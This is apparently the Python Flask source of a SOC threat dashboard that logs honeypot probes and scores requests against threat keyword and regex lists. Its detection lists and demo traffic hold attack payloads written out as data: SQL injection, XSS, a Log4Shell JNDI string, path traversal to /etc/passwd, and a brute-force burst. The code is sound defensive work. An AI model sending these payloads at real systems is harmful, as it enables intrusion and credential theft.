"""
SOC Threat Dashboard — v4
=========================
Two kinds of monitoring in one dashboard:

  Server traffic  Requests reaching this server (honeypot paths, scanners, exploits, phishing kits),
                  with geo map, rate limiting and auto-blocking. Point websites or apps at /log.
  My browser      Every request YOUR browser makes, reported by the companion extension
                  (soc-browser-extension/). Daily view of sites visited, new sites, flagged requests,
                  downloads and scam domains, with one-click blocking enforced in the browser.

Scam domains come from BBB Scam Tracker and, optionally, from your PhishGuard app (PHISHGUARD_URL).

Run
  pip install flask requests
  python soc_dashboard.py                 → http://127.0.0.1:5000  (then follow BROWSER_SETUP.md)
  python soc_dashboard.py --demo          also streams synthetic server-attack traffic
Env
  SOC_ADMIN_TOKEN              require X-SOC-Token for admin actions from other machines
  SOC_DATA_DIR                 where browser.db and browser_token.txt live (default ./soc_data)
  SOC_BROWSER_TOKEN            fixed token for the extension (default: generated once, saved in SOC_DATA_DIR)
  SOC_BROWSER_RETENTION_DAYS   days of browser history to keep (default 30)
  SOC_BROWSER_STORE_URLS       "flagged" (default: full URL only for flagged requests) or "all"
  PHISHGUARD_URL / PHISHGUARD_TOKEN   pull confirmed scam domains from your PhishGuard app
"""

from __future__ import annotations

import argparse
import hmac
import ipaddress
import json
import os
import re
import secrets
import sqlite3
import threading
import time
from collections import defaultdict, deque
from datetime import datetime, timezone
from urllib.parse import unquote, unquote_plus, urlparse

import requests as _requests
from flask import Flask, Response, jsonify, request

app = Flask(__name__)
app.config["MAX_CONTENT_LENGTH"] = 4 * 1024 * 1024  # browser batches can be large
LOG_BODY_LIMIT = 64 * 1024  # bodies sent to /log beyond this are rejected (413)

# ══════════════════════════════════════════════════════════════════════════════
# THREAT INTELLIGENCE
# Sources: IC3 2024, KnowBe4 Phishing Trends 2025, GlobalAntiScamAlliance 2024,
#          Mastercard Cyber Survey 2025, FTC 2025 top complaints.
# Keywords are matched on token boundaries after URL-decoding and normalising
# separators (space, _, +, -) to "-", so "verify_account", "verify account" and
# "verify-account" are all equivalent.
# ══════════════════════════════════════════════════════════════════════════════

THREAT_INTEL: dict[str, dict] = {
    "phishing": {
        "label": "Phishing", "weight": 35,
        "keywords": [
            "verify-account", "confirm-identity", "update-billing", "account-suspended",
            "unusual-activity", "security-alert", "login-verify", "signin-confirm",
            "reactivate-account", "limited-access", "password-reset-required",
            "unlock-account", "validate-email", "verify-email-address", "confirm-email",
            "webscr", "ebayisapi", "paypal-secure", "secure-login", "banking-online",
            "online-banking-secure", "account-secure", "credential-harvest",
            "enter-password", "submit-login", "phishkit", "phish-page",
            "paypa1", "arnazon", "g00gle", "micros0ft", "app1e", "faceb00k", "netf1ix",
            "bankofamerica-secure", "qr-redirect", "scan-qr", "qrcode-login",
            "ai-verify", "deeplink-auth", "smart-verify",
        ],
    },
    "financial_fraud": {
        "label": "Financial fraud", "weight": 40,
        "keywords": [
            "wire-transfer", "urgent-transfer", "escrow-payment", "release-funds",
            "transfer-now", "send-money-now", "western-union", "moneygram",
            "bitcoin-transfer", "crypto-payment", "btc-wallet", "eth-wallet",
            "unclaimed-funds", "lottery-winner", "inheritance-claim", "prize-claim",
            "claim-reward", "free-gift-card", "advance-fee", "processing-fee-required",
            "release-fee", "guaranteed-returns", "risk-free-investment",
            "double-your-money", "crypto-profit", "forex-signals", "pump-and-dump",
            "pig-butchering", "romance-investment", "quantum-ai-invest",
            "celebrity-endorsement-crypto", "irs-refund", "tax-refund-pending",
            "gov-payment", "stimulus-check", "benefit-payment-pending",
            "social-security-suspended", "ssn-compromised", "debt-relief-now",
            "loan-forgiveness-apply", "credit-repair-instant",
        ],
    },
    "malware_delivery": {
        "label": "Malware delivery", "weight": 45,
        "keywords": [
            "dropper", "shellcode", "stager",
            ".exe", ".bat", ".ps1", ".vbs", ".jar", ".hta", ".scr", ".pif", ".cmd",
            "c2-server", "c2-panel", "command-control",
            "ransomware", "ransom-note", "decrypt-files", "your-files-encrypted",
            "pay-ransom", "cobalt-strike", "metasploit", "brute-ratel", "havoc-c2",
            "formjack", "card-skimmer", "magecart", "exploitkit", "rig-ek", "purple-fox",
        ],
    },
    "social_engineering": {
        "label": "Social engineering", "weight": 30,
        "keywords": [
            "act-now", "expires-today", "immediate-action-required",
            "respond-immediately", "your-account-will-be-closed", "final-warning",
            "ceo-request", "executive-request", "from-the-cfo",
            "microsoft-support", "apple-support", "google-support", "amazon-support",
            "tech-support-alert", "romance-scam", "dating-investment",
            "i-love-you-send", "soulmate-invest", "voice-clone", "deepfake-verify",
            "ai-call-verify", "virus-detected-call", "your-computer-infected",
            "windows-defender-alert", "call-immediately", "sim-swap", "carrier-transfer",
        ],
    },
    "reconnaissance": {
        "label": "Reconnaissance", "weight": 25,
        "keywords": [
            ".git/config", ".env", "config.php", "wp-config", "database.yml",
            ".htaccess", "web.config", "phpinfo", "server-status", "server-info",
            "/etc/passwd", "/etc/shadow", "shadow.bak", "credentials.xml",
            "secrets.json", "id_rsa", ".bak", ".old", ".backup", ".swp", ".orig",
            "xmlrpc.php", "wp-json/wp/v2/users",
        ],
        "patterns": [r"(?:\.\./|\.\.\\){2,}"],
    },
    "exploit": {
        "label": "Exploit attempt", "weight": 60,
        "keywords": [
            "union-select", "1=1-", "<script", "javascript:", "onmouseover=",
            "onerror=", "onload=", ";cat-/", ";id;", "|whoami", "`id`",
            "java.lang.runtime", "ysoserial", "${jndi:", "${${::-j}",
            "{{7*7}}", "${7*7}", "#{7*7}", "()-{-:;-};", "latest/meta-data",
        ],
        "patterns": [
            r"union-(?:all-)?select",
            r"'-?or-?'?\d+'?-?=-?'?\d+",
            r"\$\{(?:jndi|\$\{)",
            r"\{\{-?\d+\*\d+-?\}\}",
            r"(?:\.\./){4,}",
            r"%(?:25)+2e%(?:25)+2e",
            r"169\.254\.169\.254", r"metadata\.google\.internal", r"(?<![a-z])(?:file|gopher|dict)://",
        ],
    },
    "bot_automation": {
        "label": "Scanner / bot", "weight": 15,
        "ua_keywords": [
            "python-requests", "go-http-client", "java/", "curl/", "wget/",
            "libwww-perl", "scrapy", "httpie", "axios/", "node-fetch", "got/",
            "masscan", "zgrab", "nuclei", "sqlmap", "nikto", "dirbuster", "gobuster",
            "ffuf", "wfuzz", "hydra", "medusa", "nmap-scripting", "burpsuite", "zap/",
            "acunetix", "nessus", "openvas", "metasploit", "shodan",
            "headlesschrome", "phantomjs", "selenium", "puppeteer", "playwright",
        ],
    },
    "exfiltration": {
        "label": "Data exfiltration", "weight": 40,
        "keywords": [
            "exfil", "exfiltrate", "exfiltration", "extract-data", "download-all",
            "bulk-download", "mass-export", "harvest-data", "data-mine", "dump-db",
            "mysqldump", "pg_dump", "download-users", "export-emails",
            "export-passwords", "export-keys",
        ],
    },
    "identity_theft": {
        "label": "Identity theft", "weight": 35,
        "keywords": [
            "ssn", "social-security-number", "drivers-license", "passport-number",
            "credit-card-number", "cvv", "card-expiry", "bank-account-number",
            "routing-number", "mothers-maiden-name", "security-question",
            "identity-document", "pin-number", "otp-code", "one-time-passcode",
        ],
    },
    "honeypot": {
        "label": "Honeypot probe", "weight": 60,
        "paths": [
            "/admin", "/administrator", "/wp-admin", "/wp-login.php", "/xmlrpc.php",
            "/phpmyadmin", "/pma", "/myadmin", "/shell", "/webshell", "/.git",
            "/api/v1/internal", "/actuator", "/console", "/manager/html", "/cgi-bin/",
            "/.env", "/config", "/debug", "/test", "/backup",
        ],
    },
    "ransomware_extortion": {
        "label": "Ransomware / extortion", "weight": 55,
        "keywords": [
            "pay-bitcoin", "ransom-demand", "your-files-locked", "decrypt-tool",
            "payment-deadline", "negotiation-portal", "tor-onion-payment",
            "darkweb-payment", "i-have-your-data", "data-breach-threat",
            "publish-your-data", "sextortion", "explicit-images-threat", "pay-or-publish",
        ],
    },
    "emerging_2025": {
        "label": "Emerging 2025", "weight": 30,
        "keywords": [
            "fraudgpt", "wormgpt", "darkgpt", "ai-scam-kit", "llm-phish",
            "toll-payment-due", "package-held", "delivery-fee-pending",
            "usps-package-fee", "fedex-delivery-pending", "wrong-number-invest",
            "hello-friend-invest", "qr-payment", "scan-to-pay-qr", "qr-invoice",
            "deepfake-cfo", "video-call-verify-bank", "connect-wallet",
            "approve-contract", "wallet-drain", "nft-airdrop-claim", "crypto-airdrop-free",
        ],
    },
}

THREAT_INTEL["known_scam_ioc"] = {"label": "Known scam domain", "weight": 50, "keywords": []}

# Categories scanned in each part of the request
URL_CATEGORIES = [c for c in THREAT_INTEL if c not in ("honeypot", "bot_automation")]
BODY_CATEGORIES = URL_CATEGORIES
REFERRER_CATEGORIES = ["phishing", "financial_fraud", "malware_delivery", "exploit", "emerging_2025"]
UA_CATEGORIES = ["exploit"]  # Log4Shell / Shellshock payloads often ride in the UA
ALERT_CATEGORIES = {"phishing", "financial_fraud", "malware_delivery", "exploit",
                    "ransomware_extortion", "identity_theft", "exfiltration", "known_scam_ioc"}

# ── Matcher compilation ───────────────────────────────────────────────────────
_SEP_RE = re.compile(r"[\s_+\-]+")
_EXT_RE = re.compile(r"^\.[a-z0-9]{2,6}$")


def _normalize(text: str) -> str:
    return _SEP_RE.sub("-", text.lower())


def _compile_keyword(kw: str) -> re.Pattern:
    k = _normalize(kw)
    if _EXT_RE.match(k):  # file extension: must end a path segment
        return re.compile(re.escape(k) + r"(?=$|[?#/&;\s\"'\-])")
    prefix = r"(?<![a-z0-9])" if k[0].isalnum() else ""
    suffix = r"(?![a-z0-9])" if k[-1].isalnum() else ""
    return re.compile(prefix + re.escape(k) + suffix)


def _compile_honeypot(path: str) -> re.Pattern:
    p = path.lower()
    tail = "" if p.endswith("/") else r"(?=$|[/?#.])"
    return re.compile("^" + re.escape(p) + tail)


RULES: dict[str, list[tuple[str, re.Pattern]]] = {}
for _cat, _cfg in THREAT_INTEL.items():
    matchers = [(kw, _compile_keyword(kw)) for kw in _cfg.get("keywords", []) + _cfg.get("ua_keywords", [])]
    matchers += [(f"regex:{p}", re.compile(p)) for p in _cfg.get("patterns", [])]
    RULES[_cat] = matchers
HONEYPOT_RULES = [(p, _compile_honeypot(p)) for p in THREAT_INTEL["honeypot"]["paths"]]
RULE_COUNT = sum(len(v) for v in RULES.values()) + len(HONEYPOT_RULES)

# ── Config ────────────────────────────────────────────────────────────────────
RATE_WINDOW_SECONDS = 60
RATE_BURST_LIMIT = 10   # alert above this many requests per window
RATE_BLOCK_LIMIT = 30   # auto-block at this many requests per window
ALERT_DEDUP_SECONDS = 300
SEVERITY_TIERS = [(80, "critical"), (55, "high"), (30, "medium"), (10, "low"), (0, "info")]
ADMIN_TOKEN = os.environ.get("SOC_ADMIN_TOKEN", "")
ADMIN_NETS = [ipaddress.ip_network(n) for n in
              ("127.0.0.0/8", "::1/128", "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "fc00::/7")]

TRUSTED_PROXIES = [ipaddress.ip_network(n) for n in
                   ("127.0.0.0/8", "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16", "::1/128")]

BASELINE_COUNTRIES = {
    "US", "GB", "CA", "AU", "NZ", "DE", "FR", "NL", "SE", "NO", "DK", "FI", "CH", "AT",
    "BE", "IE", "PL", "PT", "ES", "IT", "CZ", "SK", "HU", "RO", "JP", "KR", "SG", "IN",
    "PK", "IL", "BR", "ZA",
}
HOSTING_ORG_RE = re.compile(
    r"\b(hosting|datacenter|data center|colocation|vps|dedicated server|cloud|amazon|aws|"
    r"google cloud|microsoft|azure|digitalocean|linode|akamai|vultr|hetzner|ovh|fastly|"
    r"cloudflare|leaseweb|choopa|psychz|tzulo)\b", re.I)

# ── Shared state (all mutations under _lock) ──────────────────────────────────
_lock = threading.RLock()
logs: deque = deque(maxlen=2000)
alerts: deque = deque(maxlen=1000)
rate_windows: dict[str, deque] = defaultdict(deque)
BLOCKLIST: dict[str, dict] = {}
_alert_seen: dict[tuple, float] = {}
_seq = {"event": 0, "alert": 0}
_counters = {"events": 0, "alerts": 0}
START_TIME = time.time()


def _now_iso() -> str:
    return datetime.now(timezone.utc).isoformat(timespec="seconds")


def _next_id(kind: str) -> int:
    _seq[kind] += 1
    return _seq[kind]


def severity_for(risk: int) -> str:
    for threshold, name in SEVERITY_TIERS:
        if risk >= threshold:
            return name
    return "info"


# ══════════════════════════════════════════════════════════════════════════════
# GEO ENRICHMENT
# ══════════════════════════════════════════════════════════════════════════════
DEMO_GEO = {  # documentation-range IPs used only by the demo generator
    "203.0.113.10": ("Frankfurt", "Germany", "DE", 50.11, 8.68, "DEMO Hetzner Online"),
    "203.0.113.24": ("Moscow", "Russia", "RU", 55.75, 37.62, "DEMO Residential ISP"),
    "203.0.113.57": ("São Paulo", "Brazil", "BR", -23.55, -46.63, "DEMO Telecom"),
    "198.51.100.4": ("Lagos", "Nigeria", "NG", 6.52, 3.38, "DEMO Mobile Network"),
    "198.51.100.33": ("Shenzhen", "China", "CN", 22.54, 114.06, "DEMO Cloud Hosting"),
    "198.51.100.71": ("Ashburn", "United States", "US", 39.04, -77.49, "DEMO Amazon AWS"),
    "192.0.2.15": ("Bucharest", "Romania", "RO", 44.43, 26.10, "DEMO VPS Provider"),
    "192.0.2.88": ("Chicago", "United States", "US", 41.88, -87.63, "DEMO Comcast Cable"),
    "192.0.2.140": ("Hanoi", "Vietnam", "VN", 21.03, 105.85, "DEMO Datacenter"),
    "192.0.2.201": ("London", "United Kingdom", "GB", 51.51, -0.13, "DEMO BT Broadband"),
}
_geo_cache: dict[str, tuple[float, dict]] = {}
_geo_lock = threading.Lock()


def _geo_record(ip, city, country, cc, lat, lon, org, source):
    risk = 0
    if cc and cc not in BASELINE_COUNTRIES and cc != "LAN":
        risk += 15
    if org and HOSTING_ORG_RE.search(org):
        risk += 10
    return {"ip": ip, "city": city, "country": country, "cc": cc, "lat": lat,
            "lon": lon, "org": org, "geo_risk": risk, "geo_source": source}


def enrich_ip(ip: str) -> dict:
    if ip in DEMO_GEO:
        return _geo_record(ip, *DEMO_GEO[ip], source="demo")
    try:
        addr = ipaddress.ip_address(ip)
    except ValueError:
        return _geo_record(ip, "Unknown", "", "", None, None, "", "invalid")
    if not addr.is_global:
        return _geo_record(ip, "Local network", "Private", "LAN", None, None, "Private / reserved", "local")

    now = time.time()
    with _geo_lock:
        hit = _geo_cache.get(ip)
        if hit and hit[0] > now:
            return dict(hit[1])
    try:
        data = _requests.get(f"https://ipapi.co/{ip}/json/", timeout=2.5,
                             headers={"User-Agent": "soc-dashboard/3"}).json()
        if data.get("error"):
            raise ValueError(data.get("reason", "lookup error"))
        rec = _geo_record(ip, data.get("city") or "Unknown", data.get("country_name") or "",
                          data.get("country_code") or "", data.get("latitude"),
                          data.get("longitude"), data.get("org") or "", "ipapi")
        ttl = 3600
    except Exception:
        # Lookup failure is not evidence of risk: score 0, retry in 5 minutes
        rec = _geo_record(ip, "Unknown", "", "", None, None, "", "unavailable")
        ttl = 300
    with _geo_lock:
        if len(_geo_cache) > 5000:
            _geo_cache.clear()
        _geo_cache[ip] = (now + ttl, rec)
    return dict(rec)


# ══════════════════════════════════════════════════════════════════════════════
# ANALYSIS
# ══════════════════════════════════════════════════════════════════════════════
def _decoded_variants(raw: str) -> str:
    """Raw text plus up to two rounds of URL-decoding, normalised."""
    if not raw:
        return ""
    parts, cur = [raw], raw
    for _ in range(2):
        nxt = unquote_plus(cur)
        if nxt == cur:
            break
        parts.append(nxt)
        cur = nxt
    return _normalize("\n".join(parts))


def _match(text: str, category: str) -> list[str]:
    return [label for label, rx in RULES[category] if rx.search(text)] if text else []


def _get_real_ip() -> str:
    remote = request.remote_addr or "0.0.0.0"
    try:
        trusted = any(ipaddress.ip_address(remote) in n for n in TRUSTED_PROXIES)
    except ValueError:
        trusted = False
    if trusted:
        xff = request.headers.get("X-Forwarded-For", "")
        candidate = xff.split(",")[0].strip() if xff else remote
        try:
            ipaddress.ip_address(candidate)
            return candidate
        except ValueError:
            pass
    return remote


def analyze_request(path: str, query: str, ua: str, method: str, referrer: str, body: str) -> dict:
    findings: dict[str, set] = defaultdict(set)
    hit_list: list[dict] = []
    misc_tags: list[str] = []
    misc_risk = 0

    def add(cat, labels, source):
        for lbl in labels:
            if lbl not in findings[cat]:
                hit_list.append({"category": cat, "keyword": lbl, "source": source,
                                 "weight": THREAT_INTEL[cat]["weight"]})
            findings[cat].add(lbl)

    path_l = unquote(path).lower()
    for label, rx in HONEYPOT_RULES:
        if rx.search(path_l):
            add("honeypot", [label], "path")
            break

    url_text = _decoded_variants(path + ("?" + query if query else ""))
    for cat in URL_CATEGORIES:
        add(cat, _match(url_text, cat), "url")

    ua_norm = _normalize(ua)
    add("bot_automation", _match(ua_norm, "bot_automation"), "user-agent")
    for cat in UA_CATEGORIES:
        add(cat, _match(_decoded_variants(ua), cat), "user-agent")
    if not ua.strip() or ua.strip() == "-":
        misc_tags.append("MISSING_UA")
        misc_risk += 10

    if method in ("TRACE", "TRACK", "DEBUG", "CONNECT"):
        misc_tags.append("SUSPICIOUS_METHOD")
        misc_risk += 15

    if body:
        body_text = _decoded_variants(body)
        for cat in BODY_CATEGORIES:
            add(cat, _match(body_text, cat), "body")

    if referrer:
        ref_text = _decoded_variants(referrer)
        for cat in REFERRER_CATEGORIES:
            add(cat, _match(ref_text, cat), "referrer")

    iocs = scam_domain_matchers()
    for source, text in (("url", url_text), ("body", _decoded_variants(body) if body else ""),
                         ("referrer", _decoded_variants(referrer) if referrer else "")):
        if text:
            add("known_scam_ioc", [d for d, rx in iocs if rx.search(text)], source)

    risk = sum(THREAT_INTEL[c]["weight"] for c in findings) + misc_risk
    return {
        "categories": sorted(findings),
        "threat_tags": [c.upper() for c in sorted(findings)] + misc_tags,
        "keyword_hits": hit_list[:12],
        "findings": {c: sorted(v) for c, v in findings.items()},
        "risk": risk,
    }


def rate_check(ip: str) -> dict:
    """Sliding-window limiter; promotes to the blocklist at RATE_BLOCK_LIMIT."""
    now = time.time()
    with _lock:
        window = rate_windows[ip]
        while window and window[0] < now - RATE_WINDOW_SECONDS:
            window.popleft()
        window.append(now)
        count = len(window)
        just_blocked = False
        if count >= RATE_BLOCK_LIMIT and ip not in BLOCKLIST:
            BLOCKLIST[ip] = {"reason": f"Auto-blocked: {count} requests in {RATE_WINDOW_SECONDS}s",
                             "time": _now_iso(), "source": "rate_limiter"}
            just_blocked = True
        if len(rate_windows) > 10000:  # drop idle IPs
            for k in [k for k, w in rate_windows.items() if not w or w[-1] < now - RATE_WINDOW_SECONDS]:
                del rate_windows[k]
    return {"count": count, "exceeded": count > RATE_BURST_LIMIT, "just_blocked": just_blocked}


def emit_alert(ip: str, key: str, reason: str, severity: str, category: str, risk: int):
    now = time.time()
    with _lock:
        last = _alert_seen.get((ip, key))
        if last and now - last < ALERT_DEDUP_SECONDS:
            return
        _alert_seen[(ip, key)] = now
        if len(_alert_seen) > 20000:
            for k in [k for k, t in _alert_seen.items() if now - t > ALERT_DEDUP_SECONDS]:
                del _alert_seen[k]
        _counters["alerts"] += 1
        alerts.append({"id": _next_id("alert"), "ip": ip, "reason": reason[:240],
                       "severity": severity, "category": category, "risk": risk,
                       "time": _now_iso(), "ts": now})


def _ingest() -> dict:
    ip = _get_real_ip()
    path = request.path
    query = request.query_string.decode("latin-1", "replace")
    ua = request.headers.get("User-Agent", "")[:512]
    referrer = (request.referrer or "")[:1024]
    method = request.method
    body = ""
    length = request.content_length or 0
    oversized = length > LOG_BODY_LIMIT
    if method in ("POST", "PUT", "PATCH", "DELETE") and length and not oversized:
        body = request.get_data(as_text=True)[:16384]  # padding a payload past 8 KB no longer hides it

    rate = rate_check(ip)
    with _lock:
        blocked = ip in BLOCKLIST
    analysis = analyze_request(path, query, ua, method, referrer, body)
    geo = enrich_ip(ip)

    tags = list(analysis["threat_tags"])
    risk = analysis["risk"] + geo["geo_risk"]
    if rate["exceeded"]:
        tags.append("RATE_EXCEEDED")
        risk += 15
    if oversized:
        tags.append("OVERSIZED_BODY")
        risk += 10
    if blocked:
        tags.append("BLOCKED")
        risk = 100
    risk = min(int(risk), 100)
    sev = severity_for(risk)

    entry = {
        "time": _now_iso(), "ts": time.time(), "method": method,
        "path": path[:300], "query": query[:500], "ua": ua[:200], "referrer": referrer[:300],
        "categories": analysis["categories"], "threat_tags": tags,
        "keyword_hits": analysis["keyword_hits"], "rate_count": rate["count"],
        "blocked": blocked, "oversized": oversized, "risk": risk, "severity": sev, **geo,
    }
    with _lock:
        entry["id"] = _next_id("event")
        _counters["events"] += 1
        logs.append(entry)

    # ── alerts (stable keys → one alert per IP per issue per 5 min) ──
    short = (path + ("?" + query if query else ""))[:90]
    if rate["just_blocked"]:
        emit_alert(ip, "auto_block", f"Auto-blocked after {rate['count']} requests in {RATE_WINDOW_SECONDS}s",
                   "critical", "RATE_LIMIT", 100)
    elif blocked:
        emit_alert(ip, "blocked", "Traffic from blocklisted IP (403)", "high", "BLOCKED", 100)
    elif rate["exceeded"]:
        emit_alert(ip, "rate", f"Request burst: {rate['count']} in {RATE_WINDOW_SECONDS}s", "medium", "RATE_LIMIT", risk)
    if "honeypot" in analysis["findings"]:
        emit_alert(ip, "honeypot", f"Honeypot probe: {short}", sev, "HONEYPOT", risk)
    if "bot_automation" in analysis["findings"]:
        emit_alert(ip, "bot", f"Scanner / automation UA: {ua[:70]}", sev, "BOT_AUTOMATION", risk)
    for cat in analysis["categories"]:
        if cat in ALERT_CATEGORIES:
            hits = ", ".join(h.replace("regex:", "pattern ") for h in analysis["findings"][cat][:3])
            emit_alert(ip, f"cat:{cat}", f"{THREAT_INTEL[cat]['label']}: {hits}", sev, cat.upper(), risk)
    if risk >= 80 and not blocked:
        emit_alert(ip, "critical", f"Critical risk {risk}/100 on {short}", "critical", "HIGH_RISK", risk)
    return entry


# ══════════════════════════════════════════════════════════════════════════════
# ROUTES
# ══════════════════════════════════════════════════════════════════════════════
def _is_admin() -> bool:
    if ADMIN_TOKEN:
        return hmac.compare_digest(request.headers.get("X-SOC-Token", ""), ADMIN_TOKEN)
    try:
        addr = ipaddress.ip_address(request.remote_addr or "")
    except ValueError:
        return False
    # Not addr.is_private: in Python that also covers link-local, documentation and benchmark ranges.
    return any(addr in net for net in ADMIN_NETS)


def _admin_required():
    if _is_admin():
        return None
    return jsonify({"error": "Admin access required (set X-SOC-Token)"}), (401 if ADMIN_TOKEN else 403)


@app.route("/log", methods=["GET", "POST", "PUT", "PATCH", "DELETE", "TRACE"])
def log_ip():
    entry = _ingest()
    if entry["blocked"]:
        return jsonify({"status": "blocked"}), 403
    if entry["oversized"]:
        return jsonify({"status": "rejected", "error": "Request body too large"}), 413
    return jsonify({"status": "ok", "ip": entry["ip"], "risk": entry["risk"],
                    "severity": entry["severity"], "threat_tags": entry["threat_tags"]})


@app.errorhandler(404)
def catch_all(_err):
    """Every unknown path is analysed — this is how honeypot probes are caught."""
    if request.path == "/favicon.ico":
        return Response(status=204)
    entry = _ingest()
    return Response("Forbidden" if entry["blocked"] else "Not Found",
                    status=403 if entry["blocked"] else 404, mimetype="text/plain")


@app.route("/api/health")
def health():
    return jsonify({"status": "ok", "uptime_s": int(time.time() - START_TIME), "rules": RULE_COUNT})


@app.route("/api/logs")
def get_logs():
    after = request.args.get("after_id", type=int, default=0)
    limit = max(1, min(request.args.get("limit", type=int, default=200), 500))
    with _lock:
        snap = [e for e in logs if e["id"] > after]
    return jsonify(snap[-limit:])


@app.route("/api/alerts")
def get_alerts():
    after = request.args.get("after_id", type=int, default=0)
    limit = max(1, min(request.args.get("limit", type=int, default=200), 500))
    with _lock:
        snap = [a for a in alerts if a["id"] > after]
    return jsonify(snap[-limit:])


def _category_breakdown(snap):
    cats = defaultdict(int)
    for e in snap:
        for c in e.get("categories", []):
            cats[c] += 1
    return dict(sorted(cats.items(), key=lambda kv: -kv[1]))


@app.route("/api/stats")
def get_stats():
    with _lock:
        snap = list(logs)
        n_block = len(BLOCKLIST)
        blocked_ips = set(BLOCKLIST)
    sev = {name: 0 for _, name in SEVERITY_TIERS}
    sources: dict[str, dict] = {}
    for e in snap:
        sev[e["severity"]] += 1
        s = sources.setdefault(e["ip"], {"ip": e["ip"], "count": 0, "max_risk": 0,
                                         "cc": e.get("cc", ""), "city": e.get("city", ""),
                                         "last_seen": e["time"]})
        s["count"] += 1
        s["max_risk"] = max(s["max_risk"], e["risk"])
        s["last_seen"] = e["time"]
    top = sorted(sources.values(), key=lambda s: (-s["max_risk"], -s["count"]))[:8]
    for s in top:
        s["blocked"] = s["ip"] in blocked_ips
        s["severity"] = severity_for(s["max_risk"])
    return jsonify({
        "total": _counters["events"], "window": len(snap), "unique_ips": len(sources),
        "severity": sev, "alerts": _counters["alerts"], "blocklist": n_block,
        "categories": _category_breakdown(snap),
        "labels": {k: v["label"] for k, v in THREAT_INTEL.items()},
        "top_sources": top, "rules": RULE_COUNT, "uptime_s": int(time.time() - START_TIME),
    })


@app.route("/api/threat-stats")
def threat_stats():
    with _lock:
        snap = list(logs)
    by_source = defaultdict(int)
    for e in snap:
        for h in e.get("keyword_hits", []):
            by_source[h["source"]] += 1
    sev = defaultdict(int)
    for e in snap:
        sev[e["severity"]] += 1
    return jsonify({"categories": _category_breakdown(snap), "severity": dict(sev),
                    "hits_by_source": dict(by_source)})


@app.route("/api/blocklist")
def get_blocklist():
    with _lock:
        return jsonify(dict(BLOCKLIST))


@app.route("/api/block", methods=["POST"])
def block_ip():
    denied = _admin_required()
    if denied:
        return denied
    data = request.get_json(silent=True) or {}
    ip_str = str(data.get("ip", "")).strip()
    reason = str(data.get("reason") or "Manual block")[:200]
    try:
        ipaddress.ip_address(ip_str)
    except ValueError:
        return jsonify({"error": "Invalid IP address"}), 400
    with _lock:
        BLOCKLIST[ip_str] = {"reason": reason, "time": _now_iso(), "source": "manual"}
    emit_alert(ip_str, f"manual_block:{time.time()}", f"Manually blocked: {reason}", "high", "BLOCKED", 100)
    return jsonify({"status": "blocked", "ip": ip_str})


@app.route("/api/unblock", methods=["POST"])
def unblock_ip():
    denied = _admin_required()
    if denied:
        return denied
    ip_str = str((request.get_json(silent=True) or {}).get("ip", "")).strip()
    with _lock:
        removed = BLOCKLIST.pop(ip_str, None)
        rate_windows.pop(ip_str, None)  # otherwise the next request re-blocks it
        for k in [k for k in _alert_seen if k[0] == ip_str]:
            del _alert_seen[k]
    if removed:
        return jsonify({"status": "unblocked", "ip": ip_str})
    return jsonify({"error": "IP not in blocklist"}), 404


# ── Demo traffic ──────────────────────────────────────────────────────────────
CHROME = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0 Safari/537.36"
DEMO_EVENTS = [
    ("192.0.2.88", "GET", "/log?page=/pricing", CHROME, None, "https://www.google.com/search?q=soc"),
    ("192.0.2.201", "GET", "/log?page=/blog/zero-trust", CHROME, None, None),
    ("203.0.113.10", "GET", "/wp-login.php", "Mozilla/5.0 (compatible; Nuclei - Open-source project)", None, None),
    ("203.0.113.10", "GET", "/.env", "Nuclei - Open-source project", None, None),
    ("198.51.100.33", "GET", "/log?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users--", "sqlmap/1.8.4#stable (https://sqlmap.org)", None, None),
    ("198.51.100.33", "GET", "/log?q=%3Cscript%3Ealert(document.cookie)%3C/script%3E", "sqlmap/1.8.4", None, None),
    ("203.0.113.24", "GET", "/log?next=/account-suspended/verify-account&brand=paypa1", CHROME, None, None),
    ("198.51.100.4", "POST", "/log", CHROME, "subject=Inheritance claim&body=Release funds via Western Union, processing fee required", None),
    ("198.51.100.71", "GET", "/log", "${jndi:ldap://203.0.113.5:1389/a}", None, None),
    ("192.0.2.140", "GET", "/log?file=../../../../etc/passwd", "python-requests/2.32.3", None, None),
    ("203.0.113.57", "POST", "/log", CHROME, "card=credit card number&cvv=123&ssn=000-00-0000", None),
    ("192.0.2.15", "GET", "/phpmyadmin/index.php", "Mozilla/5.0 zgrab/0.x", None, None),
    ("192.0.2.15", "GET", "/log?download=invoice.pdf.exe", CHROME, None, None),
    ("198.51.100.4", "GET", "/log?promo=nft-airdrop-claim&action=connect-wallet", CHROME, None, None),
    ("192.0.2.88", "GET", "/log?page=/docs/api", CHROME, None, "https://github.com/"),
]
_demo_running = threading.Event()


def _run_demo():
    try:
        client = app.test_client()
        for ip, method, path, ua, body, ref in DEMO_EVENTS:
            headers = {"User-Agent": ua}
            if ref:
                headers["Referer"] = ref
            client.open(path, method=method, headers=headers, data=body,
                        content_type="application/x-www-form-urlencoded" if body else None,
                        environ_base={"REMOTE_ADDR": ip})
            time.sleep(0.6)
        for _ in range(RATE_BLOCK_LIMIT + 3):  # brute-force burst → auto-block
            client.post("/wp-login.php", data="log=admin&pwd=123456",
                        content_type="application/x-www-form-urlencoded",
                        headers={"User-Agent": "Hydra v9.5"}, environ_base={"REMOTE_ADDR": "203.0.113.24"})
            time.sleep(0.05)
    finally:
        _demo_running.clear()


def start_demo() -> bool:
    if _demo_running.is_set():
        return False
    _demo_running.set()
    threading.Thread(target=_run_demo, daemon=True).start()
    return True


@app.route("/api/demo", methods=["POST"])
def demo():
    denied = _admin_required()
    if denied:
        return denied
    if not start_demo():
        return jsonify({"status": "already running"}), 409
    return jsonify({"status": "started", "events": len(DEMO_EVENTS) + RATE_BLOCK_LIMIT + 3})



# ══════════════════════════════════════════════════════════════════════════════
# SCAM DOMAIN FEED (BBB + optional PhishGuard sync)
# ══════════════════════════════════════════════════════════════════════════════
DATA_DIR = os.environ.get("SOC_DATA_DIR", os.path.join(os.path.dirname(os.path.abspath(__file__)), "soc_data"))
os.makedirs(DATA_DIR, exist_ok=True)
PHISHGUARD_URL = os.environ.get("PHISHGUARD_URL", "").rstrip("/")
PHISHGUARD_TOKEN = os.environ.get("PHISHGUARD_TOKEN", "")
